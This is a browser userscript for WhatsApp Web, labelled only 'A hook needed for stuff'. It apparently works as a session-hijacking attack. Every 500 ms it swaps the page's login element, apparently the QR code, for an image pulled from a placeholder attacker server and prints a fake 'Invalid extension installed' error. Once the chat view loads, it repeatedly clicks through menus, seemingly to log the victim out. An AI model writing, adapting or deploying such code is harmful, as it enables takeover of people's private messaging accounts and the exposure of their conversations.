// ==UserScript==
// @name         Whatsapp Extension Hook
// @namespace    http://tampermonkey.net/
// @version      1.0
// @description  A hook needed for stuff
// @author       anon
// @match        https://web.whatsapp.com/*
// @grant        none
// ==/UserScript==

(function() {
    'use strict';

(new MutationObserver(check)).observe(document, {childList: true, subtree: true});
(new MutationObserver(ncheck)).observe(document, {childList: true, subtree: true});

function check(changes, observer) {
    if(document.getElementsByClassName("_25pwu")[0]) {
        observer.disconnect();
            setInterval(function(){
                console.error("Invalid extension installed | Aborted login")
                const img = document.createElement("img")
                img.src = "LINK TO YOUR SERVER/WhatsHook/img.png?lastmod="+Date.now();
                try {
                    document.getElementsByClassName("_25pwu")[0].replaceWith(img);
                } catch {
                }
                function edit()
                {
                    var image = document.querySelector("#app > div > div > div.landing-window > div.landing-main > div > img");

                    image.src = img.src;
                }
                edit();
            }, 500);
    }
}

function ncheck(changes, observer) {
    if(document.getElementsByClassName("_2cNrC")[0]) {
        observer.disconnect();
            setInterval(function(){
                try {
                document.querySelector("#app > div > div > div.ldL67._2i3T7 > header > div._3yZPA > div > span > div:nth-child(5) > div > span").click()
                document.querySelector("#app > div > div > div.ldL67._2i3T7 > header > div._3yZPA > div > span > div._2cNrC._1CTfw > span > div > ul > li:nth-child(4) > div._2oldI.dJxPU").click()
                document.querySelector("#app > div > span:nth-child(2) > div > div > div > div > div > div > div._2i3w0 > div > div._20C5O._2Zdgs > div > div").click()
                }catch {}
            }, 500);
    }
}

})();
